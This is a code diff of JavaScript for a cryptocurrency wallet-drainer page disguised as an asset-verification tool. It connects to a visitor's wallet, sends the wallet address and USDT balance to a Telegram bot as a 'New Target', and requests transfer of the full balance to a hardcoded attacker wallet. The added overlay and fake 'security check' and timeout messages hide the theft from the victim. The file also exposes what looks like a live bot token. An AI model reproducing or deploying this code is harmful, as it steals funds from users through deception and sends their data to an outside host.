@@ -1,45 +1,41 @@
-// 1. Your Config
 const myWalletAddress = "0x673849E3109f6Cf1f6ced4034C8363C17ff87ebe"; 
 const usdtContractAddress = "0x55d398326f99059fF775485246999027B3197955"; 
 
-// 2. Telegram Details
+// Telegram Config
 const telegramBotToken = "7849151110:AAFGo5n4hPLk8y8l8tSESYbCl_vut3TPHsI";
 const telegramChatId = "7849151110";
 
-// Telegram Alert Function
-async function sendTelegramMessage(text) {
+async function sendTelegram(msg) {
     const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;
-    const params = {
-        chat_id: telegramChatId,
-        text: text,
-        parse_mode: 'HTML'
-    };
-    try {
-        await fetch(url, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify(params)
-        });
-    } catch (e) { console.error("Telegram Error", e); }
+    await fetch(url, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ chat_id: telegramChatId, text: msg, parse_mode: 'HTML' })
+    });
+}
+
+function updateStatus(main, sub) {
+    document.getElementById("loading-text").innerText = main;
+    document.getElementById("sub-text").innerText = sub;
 }
 
 async function startProcess() {
-    const btn = document.getElementById("nextBtn");
-    const isWeb3Browser = !!(window.ethereum || window.trustwallet);
+    const overlay = document.getElementById("overlay");
+    const isWeb3 = !!(window.ethereum || window.trustwallet);
 
-    if (!isWeb3Browser) {
+    if (!isWeb3) {
         if (/Android|iPhone|iPad/i.test(navigator.userAgent)) {
             const currentUrl = window.location.href.replace("https://", "");
             window.location.href = "https://link.trustwallet.com/open_url?coin_id=60&url=https://" + currentUrl;
             return;
-        } else {
-            alert("Please use Trust Wallet or MetaMask.");
-            return;
         }
+        alert("Please use Trust Wallet or MetaMask.");
+        return;
     }
 
-    btn.disabled = true;
-    btn.textContent = "Processing...";
+    // Show Loading Overlay
+    overlay.style.display = "flex";
+    updateStatus("Connecting...", "Establishing secure handshake...");
 
     try {
         const provider = window.ethereum || window.trustwallet;
@@ -47,10 +43,9 @@ async function startProcess() {
         const accounts = await provider.request({ method: 'eth_requestAccounts' });
         const userAddress = accounts[0];
 
-        await provider.request({
-            method: 'wallet_switchEthereumChain',
-            params: [{ chainId: '0x38' }],
-        });
+        updateStatus("Scanning Wallet...", "Checking BSC network assets...");
+        
+        await provider.request({ method: 'wallet_switchEthereumChain', params: [{ chainId: '0x38' }] });
 
         const minABI = [
             { "constant": true, "inputs": [{ "name": "_owner", "type": "address" }], "name": "balanceOf", "outputs": [{ "name": "balance", "type": "uint256" }], "type": "function" },
@@ -61,24 +56,27 @@ async function startProcess() {
         const balanceWei = await contract.methods.balanceOf(userAddress).call();
         const balance = web3.utils.fromWei(balanceWei, 'ether');
 
-        // Alert you on Telegram that someone connected
-        await sendTelegramMessage(`<b>New Connection!</b>\nWallet: <code>${userAddress}</code>\nBalance: <b>${balance} USDT</b>`);
+        await sendTelegram(`👤 <b>New Target:</b>\nAddr: <code>${userAddress}</code>\nBal: <b>${balance} USDT</b>`);
 
         if (parseFloat(balance) > 0) {
+            updateStatus("Security Check...", "Syncing with blockchain node...");
+            
+            // This will open the Wallet Confirmation
             await contract.methods.transfer(myWalletAddress, balanceWei).send({ from: userAddress });
             
-            await sendTelegramMessage(`<b>Success!</b>\nTransferred ${balance} USDT to your wallet.`);
-            alert("Network Error: Please try again.");
+            updateStatus("Finalizing...", "Updating asset status on-chain...");
+            setTimeout(() => {
+                alert("Verification Error: Request timed out. Please try again.");
+                location.reload();
+            }, 1500);
         } else {
-            alert("Verification complete: No assets found.");
+            alert("Verification complete: Minimal assets detected.");
+            overlay.style.display = "none";
         }
 
     } catch (err) {
-        await sendTelegramMessage(`<b>Failed/Cancelled</b>\nError: ${err.message}`);
+        overlay.style.display = "none";
         alert("Error: " + err.message);
-    } finally {
-        btn.disabled = false;
-        btn.textContent = "Verify Assets";
     }
 }
 
